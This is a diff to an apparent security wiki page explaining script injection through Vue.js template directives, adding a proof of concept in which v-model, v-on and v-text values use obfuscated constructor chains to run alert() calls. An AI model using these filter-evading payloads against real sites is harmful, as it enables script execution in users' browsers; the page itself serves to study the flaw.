@@ -44,6 +44,36 @@ new Vue({
 </div>
 }}}
 
+Not only the v-html attribute can be attacked like this, also most of the other available markup sugars are welcoming this vector.
+
+{{{
+<script type='text/javascript' src="https://rawgit.com/yyx990803/vue/master/dist/vue.js"></script>
+<script type='text/javascript'>
+window.onload=function(){
+new Vue({
+    el: 'body',
+    data: {
+        clicked: false,
+        selected:1,
+        disp:1
+    },
+    methods: {
+        onChange:function(){
+            this.disp = this.selected;
+        }
+    }
+})
+
+}
+</script>
+<select v-model="['cons'/**/+'tructor']['cons'/**/+'tructor']['cons'/**/+'tructor']('alert(3)')()" v-on="change:['cons'/**/+'tructor']['cons'/**/+'tructor']['cons'/**/+'tructor']('alert(1)')()">
+<option value="1">one</option>
+<option value="2">two</option>
+<option value="3">three</option>
+</select>
+<div v-text="['cons'/**/+'tructor']['cons'/**/+'tructor']['cons'/**/+'tructor']('alert(2)')()"></div>
+}}}
+
 Now, why is that so? Let's have a look at the details.
 
 == Eval via Function ==
